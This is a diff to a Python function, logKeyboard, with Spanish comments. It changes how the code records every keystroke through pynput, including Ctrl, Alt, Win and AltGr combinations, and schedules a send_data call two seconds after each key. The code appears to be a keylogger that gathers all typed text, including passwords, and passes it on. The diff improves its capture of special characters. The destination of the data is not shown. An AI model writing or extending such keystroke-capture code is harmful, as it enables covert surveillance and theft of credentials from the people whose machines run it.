@@ -149,7 +149,7 @@ def logKeyboard():
 
     def on_press(key):
         nonlocal last_key_time, pressed_keys, timer
-        # Verificación teclas clave
+        # Verificar las teclas modificadoras
         if key in {pynput_keyboard.Key.alt_l, pynput_keyboard.Key.alt_r}:
             modifier_state['alt'] = True
         elif key in {pynput_keyboard.Key.ctrl_l, pynput_keyboard.Key.ctrl_r}:
@@ -157,40 +157,50 @@ def logKeyboard():
         elif key in {pynput_keyboard.Key.cmd_l, pynput_keyboard.Key.cmd_r}: 
             modifier_state['win'] = True
         else:
-            hotkey_str = ''
-            if modifier_state['ctrl']:
-                hotkey_str += 'CTRL + '
-            if modifier_state['alt']:
-                hotkey_str += 'ALT + '
-            if modifier_state['win']:
-                hotkey_str += 'WIN + '
-            if hotkey_str:
-                hotkey_str += get_key_str(key)
+            key_char = get_key_str(key)
+            
+            # Detectar si se presiona AltGr (Ctrl + Alt)
+            alt_gr_pressed = modifier_state['ctrl'] and modifier_state['alt']
+
+            # Para Ctrl + Alt + Letra, registrar la combinación
+            if alt_gr_pressed and key_char.isalpha():
+                hotkey_str = 'CTRL + ALT + ' + key_char
                 pressed_keys.append(hotkey_str)
-                send_data()  
+            # Para AltGr + número (u otros caracteres), registrar solo el carácter resultante
+            elif alt_gr_pressed and not key_char.isalpha():
+                if hasattr(key, 'char'):
+                    pressed_keys.append(key.char)
+            elif modifier_state['ctrl'] or modifier_state['alt'] or modifier_state['win']:
+                # Para otras combinaciones, construir y registrar la combinación
+                hotkey_str = ''
+                if modifier_state['ctrl']:
+                    hotkey_str += 'CTRL + '
+                if modifier_state['alt']:
+                    hotkey_str += 'ALT + '
+                if modifier_state['win']:
+                    hotkey_str += 'WIN + '
+
+                hotkey_str += key_char
+                pressed_keys.append(hotkey_str)
             else:
-                try:
-                    if key == pynput_keyboard.Key.space:
-                        key_char = ' '
-                    else:
-                        key_char = get_key_str(key) 
-                    pressed_keys.append(key_char)
-                    last_key_time = time()
-                    if timer is not None:
-                        timer.cancel()
-                    timer = threading.Timer(2, send_data)
-                    timer.start()
-                except AttributeError:
-                    pass  # Manejar casos de teclas especiales
+                # Registrar solo la tecla presionada
+                pressed_keys.append(key_char)
+
+            # Enviar datos en caso positivo
+            last_key_time = time()
+            if timer is not None:
+                timer.cancel()
+            timer = threading.Timer(2, send_data)
+            timer.start()
 
     def on_release(key):
+        # Actualizar el estado de las teclas modificadoras cuando se sueltan
         if key in {pynput_keyboard.Key.alt_l, pynput_keyboard.Key.alt_r}:
             modifier_state['alt'] = False
         elif key in {pynput_keyboard.Key.ctrl_l, pynput_keyboard.Key.ctrl_r}:
             modifier_state['ctrl'] = False
         elif key in {pynput_keyboard.Key.cmd_l, pynput_keyboard.Key.cmd_r}: 
             modifier_state['win'] = False
-
 
     # Ejecuta la función correspondiente al pulsar una tecla
     with pynput_keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
